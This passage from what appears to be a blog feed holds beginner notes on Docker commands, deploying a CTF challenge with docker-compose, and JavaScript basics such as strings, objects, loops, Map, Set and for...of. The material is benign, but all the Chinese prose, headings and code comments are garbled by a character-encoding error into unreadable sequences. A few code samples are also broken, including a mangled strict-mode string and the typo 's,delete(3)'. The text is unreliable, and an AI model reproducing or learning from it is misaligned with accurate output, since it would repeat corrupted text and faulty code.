<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153615560.png" alt="image-20200813153615560"></p>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker version  &#x2F;&#x2F;ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">docker info  &#x2F;&#x2F;ç³»ç»Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p>æ–‡æ¡£ï¼š<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p>
<p><strong>é•œåƒå‘½ä»¤</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images -a  //åˆ—å‡ºæ‰€æœ‰é•œåƒ</span><br><span class="line">dokcer images -q  //åªæ˜¾ç¤ºid</span><br><span class="line"><span class="meta">[root@/]#</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY(é•œåƒçš„ä»“åº“æº)          TAG(æ ‡ç­¾)                 IMAGE ID(é•œåƒçš„id)            CREATED(åˆ›å»ºæ—¶é—´)             SIZE(å¤§å°)</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"></span><br><span class="line">docker search  mysql  //æœç´¢é•œåƒ</span><br><span class="line">dokcer pull mysql[:tag]  //ä¸‹è½½é•œåƒ</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line">docker rmi -f id  //åˆ é™¤é•œåƒ</span><br><span class="line">docker rmi -f $(docker images -aq)  //åˆ é™¤å…¨éƒ¨é•œåƒ</span><br></pre></td></tr></table></figure>
<p><strong>å®¹å™¨å‘½ä»¤</strong></p>
<p>==æœ‰é•œåƒæ‰å¯ä»¥åˆ›å»ºå®¹å™¨ï¼Œå…ˆå®‰è£…ä¸€ä¸ªcentos==</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull centos</span><br><span class="line">docker run [å‚æ•°] image  //æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨</span><br><span class="line">--name="name1"  //å®¹å™¨åå­—</span><br><span class="line">-d  //åå°è¿è¡Œ</span><br><span class="line">-P  //éšæœºæŠŠå®¹å™¨çš„ç«¯å£æ˜ å°„åˆ°ä¸€ä¸ªä¸»æœºæœªä½¿ç”¨çš„é«˜ç«¯å£</span><br><span class="line">-i  //ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¸¸ä¸-tè¿ç”¨</span><br><span class="line">-t  //ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œå¸¸ä¸-iè¿ç”¨</span><br><span class="line">-it  //äº¤äº’æ–¹å¼è¿è¡Œ</span><br><span class="line">-p ipï¼šä¸»æœºç«¯å£ï¼šå®¹å™¨ç«¯å£  //æŒ‡å®šå®¹å™¨ç«¯å£</span><br><span class="line"></span><br><span class="line">docker ps //æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps -a  //å†å²è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker rm å®¹å™¨id  //åˆ é™¤å®¹å™¨</span><br><span class="line">docker rm -f $(docker ps -aq)  //åˆ é™¤æ‰€æœ‰å®¹å™¨</span><br><span class="line">docker start å®¹å™¨id  //å¯åŠ¨å®¹å™¨</span><br><span class="line">docker restart å®¹å™¨id  //é‡å¯å®¹å™¨</span><br><span class="line">docker stop å®¹å™¨id  //åœæ­¢å®¹å™¨</span><br><span class="line">docker kill å®¹å™¨id  //æ€æ­»å®¹å™¨</span><br><span class="line"></span><br><span class="line">//è¿›å…¥å®¹å™¨</span><br><span class="line">docker run -it centos /bin/bash</span><br><span class="line">//é€€å‡ºå®¹å™¨</span><br><span class="line">exit  åœæ­¢é€€å‡º</span><br><span class="line">ctrl+p+q  ä¸åœæ­¢é€€å‡º</span><br></pre></td></tr></table></figure>
<h2 id="ä»githubå¤ç°CTF"><a href="#ä»githubå¤ç°CTF" class="headerlink" title="ä»githubå¤ç°CTF"></a>ä»githubå¤ç°CTF</h2><p>é¦–å…ˆä»githubä¸Šcloneä¸‹æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone xxx</span><br></pre></td></tr></table></figure>
<p>è‹¥æœ‰docker.ymlç›´æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">docker ps #æŸ¥çœ‹ç«¯å£å·</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæœ‰dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿›å…¥dockerfileç›®å½•</span><br><span class="line">è®¾ç½®æƒé™</span><br><span class="line">docker build -t &#39;è‡ªå®šä¹‰é•œåƒåç§°&#39; .(æœ€åæœ‰ä¸€ä¸ªç‚¹)</span><br><span class="line">docker run --name&#x3D;&#39;è‡ªå®šä¹‰å®¹å™¨åç§°&#39; -i -d -P é•œåƒåç§° &#x2F;run.sh</span><br><span class="line">docker ps &#x2F;&#x2F;æŸ¥çœ‹ç«¯å£å·</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç«¯å£å·</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151417590.png" alt="image-20201006151417590"></p>
<p>éƒ¨ç½²å®Œæˆ</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151456458.png" alt="image-20201006151456458"></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascriptå­¦ä¹ </title>
    <url>/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>å‚è€ƒå»–é›ªå³°æ•™ç¨‹<a href="https://www.liaoxuefeng.com/wiki/1022910821149312" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1022910821149312</a></p>
<h1 id="å…¥é—¨javascript"><a href="#å…¥é—¨javascript" class="headerlink" title="å…¥é—¨javascript"></a>å…¥é—¨javascript</h1><h2 id="å¼•å…¥javascript"><a href="#å¼•å…¥javascript" class="headerlink" title="å¼•å…¥javascript"></a>å¼•å…¥javascript</h2><p><strong>å†…éƒ¨æ ‡ç­¾</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	/...</span><br><span class="line">	..</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>å¤–éƒ¨å¼•å…¥</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./.."</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å˜é‡</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// æ¡ä»¶æ§åˆ¶</span></span><br><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">..</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(num)</span></span><br></pre></td></tr></table></figure>
<h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p><strong>å˜é‡</strong></p>
<p>å˜é‡åæ˜¯å¤§å°å†™è‹±æ–‡ã€æ•°å­—ã€<code>$</code>å’Œ<code>_</code>çš„ç»„åˆï¼Œä¸”ä¸èƒ½ç”¨æ•°å­—å¼€å¤´</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> $<span class="number">1</span> = <span class="string">"a"</span>;</span><br></pre></td></tr></table></figure>
<p><strong>æ•°å­—</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">123</span> <span class="comment">//æ•´æ•°</span></span><br><span class="line"><span class="number">123.1</span> <span class="comment">//æµ®ç‚¹æ•°</span></span><br><span class="line"><span class="number">1.1e1</span> <span class="comment">//ç§‘å­¦è®¡æ•°æ³•</span></span><br><span class="line"><span class="literal">NaN</span>  <span class="comment">//not a number</span></span><br><span class="line"><span class="string">'abc'</span> <span class="comment">//å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="literal">true</span> <span class="comment">//å¸ƒå°”å€¼</span></span><br></pre></td></tr></table></figure>
<p><strong>æ¯”è¾ƒè¿ç®—ç¬¦</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">=</span><br><span class="line">== ç­‰äºï¼ˆç±»å‹ä¸ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰</span><br><span class="line">===  ç»å¯¹ç­‰äºï¼ˆç±»å‹ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰</span><br></pre></td></tr></table></figure>
<ol>
<li>NaN===NaNæ˜¯falseï¼Œå®ƒä¸ä»»ä½•å€¼éƒ½ä¸ç›¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªå·±ã€‚</li>
<li>isNaNï¼ˆNaNï¼‰ä¼šè¿”å›trueã€‚</li>
</ol>
<p><strong>æ•°ç»„</strong></p>
<blockquote>
<p>ä¸­æ‹¬å·</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"hello"</span>]</span><br></pre></td></tr></table></figure>
<p><strong>å¯¹è±¡</strong></p>
<blockquote>
<p>å¤§æ‹¬å·,æ¯ä¸ªå±æ€§ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¸éœ€è¦</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">		name: <span class="string">"111"</span>,</span><br><span class="line">		age: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.name</span><br><span class="line">&gt;<span class="number">111</span></span><br><span class="line">person.age</span><br><span class="line">&gt;<span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="strictæ¨¡å¼"><a href="#strictæ¨¡å¼" class="headerlink" title="strictæ¨¡å¼"></a><strong>strictæ¨¡å¼</strong></h3><p>åœ¨åŒä¸€ä¸ªé¡µé¢çš„ä¸åŒçš„JavaScriptæ–‡ä»¶ä¸­ï¼Œå¦‚æœéƒ½ä¸ç”¨<code>var</code>ç”³æ˜ï¼Œæ°å¥½éƒ½ä½¿ç”¨äº†å˜é‡<code>i</code>ï¼Œå°†é€ æˆå˜é‡<code>i</code>äº’ç›¸å½±å“ï¼Œäº§ç”Ÿéš¾ä»¥è°ƒè¯•çš„é”™è¯¯ç»“æœã€‚</p>
<p>ä½¿ç”¨<code>var</code>ç”³æ˜çš„å˜é‡åˆ™ä¸æ˜¯å…¨å±€å˜é‡ï¼Œå®ƒçš„èŒƒå›´è¢«é™åˆ¶åœ¨è¯¥å˜é‡è¢«ç”³æ˜çš„å‡½æ•°ä½“å†…ï¼ˆå‡½æ•°çš„æ¦‚å¿µå°†ç¨åè®²è§£ï¼‰ï¼ŒåŒåå˜é‡åœ¨ä¸åŒçš„å‡½æ•°ä½“å†…äº’ä¸å†²çªã€‚</p>
<p>ä¸ºäº†ä¿®è¡¥JavaScriptè¿™ä¸€ä¸¥é‡è®¾è®¡ç¼ºé™·ï¼ŒECMAåœ¨åç»­è§„èŒƒä¸­æ¨å‡ºäº†strictæ¨¡å¼ï¼Œåœ¨strictæ¨¡å¼ä¸‹è¿è¡Œçš„JavaScriptä»£ç ï¼Œå¼ºåˆ¶é€šè¿‡<code>var</code>ç”³æ˜å˜é‡ï¼Œæœªä½¿ç”¨<code>var</code>ç”³æ˜å˜é‡å°±ä½¿ç”¨çš„ï¼Œå°†å¯¼è‡´è¿è¡Œé”™è¯¯ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line">abc = <span class="string">""</span>hello world<span class="string">";</span></span><br><span class="line"><span class="string">//ä½¿ç”¨strictæ¨¡å¼ä¸Šé¢ä»£ç ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="string">var abc = "</span>hello world<span class="string">";</span></span><br></pre></td></tr></table></figure>
<h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line">\n</span><br><span class="line">\t</span><br><span class="line"><span class="string">'\x41'</span>; <span class="comment">// å®Œå…¨ç­‰åŒäº 'A'</span></span><br><span class="line"><span class="string">'\u4e2d\u6587'</span>; <span class="comment">// å®Œå…¨ç­‰åŒäº 'ä¸­æ–‡'</span></span><br></pre></td></tr></table></figure>
<h3 id="å¤šè¡Œå­—ç¬¦ä¸²"><a href="#å¤šè¡Œå­—ç¬¦ä¸²" class="headerlink" title="å¤šè¡Œå­—ç¬¦ä¸²"></a><strong>å¤šè¡Œå­—ç¬¦ä¸²</strong></h3><p>ç”±äºå¤šè¡Œå­—ç¬¦ä¸²ç”¨<code>\n</code>å†™èµ·æ¥æ¯”è¾ƒè´¹äº‹ï¼Œæ‰€ä»¥æœ€æ–°çš„ES6æ ‡å‡†æ–°å¢äº†ä¸€ç§å¤šè¡Œå­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹æ³•ï¼Œç”¨åå¼•å· ``è¡¨ç¤º</p>
<h3 id="æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="æ¨¡æ¿å­—ç¬¦ä¸²"></a><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong></h3><p>è¦æŠŠå¤šä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥,å¯ä»¥ç”¨<code>+</code>ä¹Ÿå¯ä»¥ç”¨<code>`${..}</code>è¡¨ç¤º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//+å·</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span>+name);</span><br><span class="line"><span class="comment">//$&#123;&#125;</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`123<span class="subst">$&#123;name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
<p><strong>æ“ä½œå­—ç¬¦ä¸²</strong></p>
<blockquote>
<p>å­—ç¬¦ä¸²æ˜¯ä¸å¯æ”¹å˜çš„ï¼Œæ— è®ºä¹‹åèµ‹å€¼ï¼Œéƒ½ä¸ä¼šæ”¹å˜ã€‚</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(s.length); <span class="comment">//é•¿åº¦</span></span><br><span class="line"><span class="built_in">console</span>.log(s[<span class="number">0</span>]); <span class="comment">//è¾“å‡º</span></span><br></pre></td></tr></table></figure>
<h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>JavaScriptçš„<code>Array</code>å¯ä»¥åŒ…å«ä»»æ„æ•°æ®ç±»å‹ï¼Œå¹¶é€šè¿‡ç´¢å¼•æ¥è®¿é—®æ¯ä¸ªå…ƒç´ ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.length;</span><br><span class="line">arr.length = <span class="number">6</span>; <span class="comment">//å¯ä»¥é€šè¿‡ç»™lengthèµ‹å€¼ï¼Œæ”¹å˜æ•°ç»„çš„å¤§å°</span></span><br></pre></td></tr></table></figure>
<h2 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h2><p>JavaScriptçš„å¯¹è±¡æ˜¯ä¸€ç§æ— åºçš„é›†åˆæ•°æ®ç±»å‹ï¼Œå®ƒç”±è‹¥å¹²é”®å€¼å¯¹ç»„æˆã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">	name: <span class="string">'xiao'</span>,</span><br><span class="line">	age: <span class="number">18</span>,</span><br><span class="line">	<span class="string">'school'</span>: <span class="string">'No.1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(xiao.name)</span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'name'</span>])  <span class="comment">//ä¸¤ç§éƒ½å¯ä»¥è®¿é—®xiaoçš„nameå€¼</span></span><br><span class="line"><span class="built_in">console</span>.log(xiao[<span class="string">'school'</span>])</span><br></pre></td></tr></table></figure>
<p>ç”±äºJavaScriptçš„å¯¹è±¡æ˜¯åŠ¨æ€ç±»å‹ï¼Œä½ å¯ä»¥è‡ªç”±åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ æˆ–åˆ é™¤å±æ€§.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiao=&#123;</span><br><span class="line">	name: <span class="string">'xiao'</span>,</span><br><span class="line">&#125;</span><br><span class="line">xiao.age=<span class="number">18</span>;</span><br><span class="line">alert(xiao.age);</span><br><span class="line"><span class="keyword">delete</span> xiao.age</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯ä»¥ç”¨hasOwnProperty()æ–¹æ³•æ¥åˆ¤æ–­å±æ€§æ˜¯å¦æ˜¯è‡ªèº«æ‹¥æœ‰çš„</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'name'</span>) <span class="comment">//true</span></span><br><span class="line">xiao.hasOwnProperty(<span class="string">'age'</span>) <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<h2 id="æ¡ä»¶åˆ¤æ–­"><a href="#æ¡ä»¶åˆ¤æ–­" class="headerlink" title="æ¡ä»¶åˆ¤æ–­"></a>æ¡ä»¶åˆ¤æ–­</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å•ä¸ªåˆ¤æ–­</span><br><span class="line">if(...)&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;å¤šè¡Œæ¡ä»¶åˆ¤æ–­</span><br><span class="line">	if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else if()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JavaScriptæŠŠ<code>null</code>ã€<code>undefined</code>ã€<code>0</code>ã€<code>NaN</code>å’Œç©ºå­—ç¬¦ä¸²<code>&#39;&#39;</code>è§†ä¸º<code>false</code>ï¼Œå…¶ä»–å€¼ä¸€æ¦‚è§†ä¸º<code>true</code>.</p>
<h2 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(;;)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>forå¾ªç¯æœ€å¸¸ç”¨çš„åœ°æ–¹å°±æ˜¯éå†æ•°ç»„</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br></pre></td></tr></table></figure>
<h3 id="for-in"><a href="#for-in" class="headerlink" title="for in"></a><strong>for in</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">	name: <span class="string">'bob'</span>,</span><br><span class="line">	age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> o)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(key);</span><br><span class="line">  <span class="built_in">console</span>.log(o[key]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name age</span></span><br><span class="line"><span class="comment">//bob 18</span></span><br><span class="line"><span class="comment">//åŒæ ·ï¼Œæ•°ç»„ä¸­ä¹Ÿå¯ä»¥ç”¨for...in</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> a)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//A  B  C</span></span><br></pre></td></tr></table></figure>
<p><strong>while</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(...)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>doâ€¦while</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;while(...)</span><br></pre></td></tr></table></figure>
<h2 id="Mapå’ŒSet"><a href="#Mapå’ŒSet" class="headerlink" title="Mapå’ŒSet"></a>Mapå’ŒSet</h2><p>JavaScriptçš„é»˜è®¤å¯¹è±¡è¡¨ç¤ºæ–¹å¼<code>{}</code>å¯ä»¥è§†ä¸ºå…¶ä»–è¯­è¨€ä¸­çš„<code>Map</code>æˆ–<code>Dictionary</code>çš„æ•°æ®ç»“æ„ï¼Œå³ä¸€ç»„é”®å€¼å¯¹ã€‚</p>
<p>ä½†æ˜¯JavaScriptçš„å¯¹è±¡æœ‰ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯é”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€‚<strong>ä½†å®é™…ä¸ŠNumberæˆ–è€…å…¶ä»–æ•°æ®ç±»å‹ä½œä¸ºé”®ä¹Ÿæ˜¯éå¸¸åˆç†çš„ã€‚</strong></p>
<h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a><strong>Map</strong></h3><p><code>Map</code>æ˜¯ä¸€ç»„é”®å€¼å¯¹çš„ç»“æ„ï¼Œå…·æœ‰æå¿«çš„æŸ¥æ‰¾é€Ÿåº¦ã€‚</p>
<p>åˆå§‹åŒ–<code>Map</code>éœ€è¦ä¸€ä¸ª<strong>äºŒç»´æ•°ç»„</strong>ï¼Œæˆ–è€…ç›´æ¥åˆå§‹åŒ–ä¸€ä¸ªç©º<code>Map</code>ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Mapåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">//å¢</span></span><br><span class="line">m.set(<span class="string">'Bob'</span>,<span class="number">100</span>);</span><br><span class="line">m.set(<span class="string">'Pz1o'</span>,<span class="number">99</span>);</span><br><span class="line"><span class="comment">//åˆ </span></span><br><span class="line">m.delete(<span class="string">'Bob'</span>);</span><br><span class="line"><span class="comment">//æŸ¥</span></span><br><span class="line">m.has(<span class="string">'Pz1o'</span>); <span class="comment">//true</span></span><br><span class="line">m.get(<span class="string">'Pz1o'</span>); <span class="comment">//99</span></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šä¸€ä¸ªkeyåªèƒ½å¯¹åº”ä¸€ä¸ªvalueï¼Œé‡å¤å®šä¹‰åé¢çš„å€¼ä¼šè¦†ç›–æ‰å‰é¢çš„å€¼ã€‚</p>
<hr>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p><code>Set</code>å’Œ<code>Map</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç»„keyçš„é›†åˆï¼Œä½†ä¸å­˜å‚¨valueã€‚ç”±äºkeyä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥ï¼Œåœ¨<code>Set</code>ä¸­ï¼Œæ²¡æœ‰é‡å¤çš„keyã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//setåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//é‡å¤å…ƒç´ ä¼šè¢«è‡ªåŠ¨è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="comment">//å¢</span></span><br><span class="line">s.add(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//åˆ </span></span><br><span class="line">s,<span class="keyword">delete</span>(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//æŸ¥</span></span><br><span class="line">s;</span><br></pre></td></tr></table></figure>
<h2 id="iterable"><a href="#iterable" class="headerlink" title="iterable"></a>iterable</h2><p>éå†<code>Array</code>å¯ä»¥é‡‡ç”¨ä¸‹æ ‡å¾ªç¯ï¼Œéå†<code>Map</code>å’Œ<code>Set</code>å°±æ— æ³•ä½¿ç”¨ä¸‹æ ‡ã€‚ä¸ºäº†ç»Ÿä¸€é›†åˆç±»å‹ï¼ŒES6æ ‡å‡†å¼•å…¥äº†æ–°çš„<code>iterable</code>ç±»å‹ï¼Œ<code>Array</code>ã€<code>Map</code>å’Œ<code>Set</code>éƒ½å±äº<code>**iterable</code>ç±»å‹ã€‚**</p>
<p><strong>å…·æœ‰<code>iterable</code>ç±»å‹çš„é›†åˆå¯ä»¥é€šè¿‡æ–°çš„<code>for ... of</code>å¾ªç¯æ¥éå†ã€‚</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">'A'</span>,<span class="string">'a'</span>],[<span class="string">'Y'</span>,<span class="string">'y'</span>]]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> a)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> s)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1  2  3</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">of</span> m)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//["A","a"]  ["Y","y"]</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>for...in</code>å’Œ<code>for...of</code>çš„ä¸åŒç‚¹ï¼š</p>
<p><code>for...in</code>ä¼šéå†å¯¹è±¡çš„æ‰€æœ‰å±æ€§åç§°ï¼Œä¸€ä¸ª<code>Array</code>æ•°ç»„å®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„æ¯ä¸ªå…ƒç´ çš„ç´¢å¼•è¢«è§†ä¸ºä¸€ä¸ªå±æ€§ã€‚</p>
<p><code>for...of</code>åˆ™ä¿®å¤äº†è¿™äº›é—®é¢˜ï¼Œå®ƒåªéå†å¾ªç¯é›†åˆçš„æœ¬èº«å…ƒç´ ã€‚</p>
</blockquote>
